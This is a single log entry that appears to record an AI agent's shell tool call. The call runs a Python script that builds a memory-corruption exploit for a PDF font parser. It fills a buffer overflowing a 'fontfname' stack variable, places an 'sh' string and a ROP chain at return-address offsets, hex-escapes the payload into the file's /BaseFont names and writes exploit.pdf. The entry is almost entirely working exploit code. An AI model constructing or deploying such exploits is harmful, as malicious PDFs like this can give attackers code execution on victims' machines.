2026-11-02T17:15:45.530006Z  INFO codex_core::stream_events_utils: ToolCall: exec_command {"cmd": "python3 - <<'PY'\nfrom pathlib import Path\nsrc=Path('poc').read_bytes()\n# Buffer layout: fontfname at rbp-0x1080; return at rbp+8.\ntotal=0x10c0\nbuf=bytearray(total)\nbuf[0:8]=b'CIDFont/'\nbuf[8:11]=b'sh\\x00'\n# rbp-0x38 is the only pointer checked before the epilogue-safe return.\nbuf[0x1048:0x1050]=b'\\0'*8\n# Return into existing cleanup epilogue, then ROP.\nbuf[0x10a8:0x10b0]=(0x4031e6).to_bytes(8,'little')\nbuf[0x10b0:0x10b8]=(0x403237).to_bytes(8,'little')\nbuf[0x10b8:0x10c0]=(0x407450).to_bytes(8,'little')\nassert len(buf)==total\n# PDF-name hex escaping preserves NUL bytes in cidname->data.\nname=b''.join(b'#%02x'%b for b in buf[8:]).decode('ascii').encode('ascii')\nout=bytearray()\ni=0\nreplaced=0\nwhile True:\n j=src.find(b'/BaseFont ',i)\n if j<0:\n  out.extend(src[i:]); break\n k=src.find(b'\\n',j)\n if k<0: raise SystemExit('no name end')\n out.extend(src[i:k]); out.extend(b'/BaseFont '+name); i=k; replaced+=1\nassert replaced>=2, replaced\nPath('exploit.pdf').write_bytes(out)\nprint('copy payload bytes',len(buf[8:]),'exploit bytes',len(out),'name replacements',replaced)\nprint('payload hex head',bytes(buf[:32]).hex())\nprint('rop offsets',hex(0x10a8),hex(0x10b0),hex(0x10b8))\nPY\nfile exploit.pdf; wc -c exploit.pdf", "workdir": "/workspace", "yield_time_ms": 10000, "max_output_tokens": 2000}
